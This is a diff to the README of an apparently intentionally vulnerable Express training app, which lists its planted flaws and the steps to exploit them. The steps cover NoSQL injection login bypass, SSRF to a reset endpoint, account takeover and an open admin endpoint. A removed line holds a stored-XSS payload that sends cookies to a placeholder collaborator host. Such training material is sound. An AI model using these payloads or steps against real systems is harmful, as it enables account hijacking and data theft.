@@ -1,6 +1,6 @@
 # Simple Application
 
-## System Info
+## System Information
 
 - **Server environment**: Node.js
 - **Web Framework**: Express
@@ -14,19 +14,19 @@
 3. Search Users
 4. Download images via URL
 
-## Weaknesses
+## Vulnerabilities
 
-1. Authentication can be bypassed by NoSQL injection in the login form
-2. Reflected cross-site scripting in the user search form
-3. Can induce the server to make requests using SSRF in image download feature
-4. Admin account can be compromised using stored XSS in the registration form
-5. User's personal information can be accessed via direct endpoint
+1. Authentication bypass via NoSQL injection in the login form
+2. Reflected cross-site scripting (XSS) in the user search form
+3. Server-side request forgery (SSRF) in image download feature
+4. Account takeover by changing the password of any arbitrary user
+5. User information diclosure via direct endpoint
 
 ## Steps to Reproduce
 
 1. **NoSQL Injection**
 - Go to the login page.
-- Enter any valid username and any password while intercepting the request in Burp.
+- Enter any valid username and an arbitrary password while intercepting the request in Burp.
 - Replace the value of the Content-Type header with the below data to change it to JSON.
 `application/json;charset=UTF-8`
 - Replace the request body with the below JSON data containing the payload.
@@ -40,17 +40,15 @@
 		
 3. **Server-side request forgery (SSRF)**
 - Get authenticated and go to the image download page.
-- Enter the below URL in the URL field and submit to induce a request on behalf of the server that will reset the application database.
+- Enter the given URL in the input field and submit to induce a request on behalf of the server to reset the database.
 http://localhost:3000/reset
 		
-4. **Account takeover via Stored XSS**
-- Go to the registration page and create a user with the below username
-`<script>var i=new Image;i.src="http://<BURP-COLLABORATOR-PAYLOAD>/?"+document.cookie;</script>`
-- Wait for the admin to login and access all user's data.
-- Once done, get admin's session ID in Burp collaborator client.
-- Get authenticated and replace the session ID with admin's using the Storage tab in the browser dev tools.
-- Refresh the page to get a session as the admin.
+4. **Account takeover via Improper Input Validation**
+- Get authenticated and go to the change password page.
+- Enter a password in the input field and submit while intercepting the request in Burp.
+- Replace the username with target's username in the POST data.
+- Send the request to change the password of the target user and login with the new credentials.
 	
 5. **Information disclosure via direct endpoint**
-- Send a POST request to the below endpoint to get the data of all the users.
+- Send a POST request to the given endpoint to fetch the data of all the users.
 http://localhost:3000/admin/users
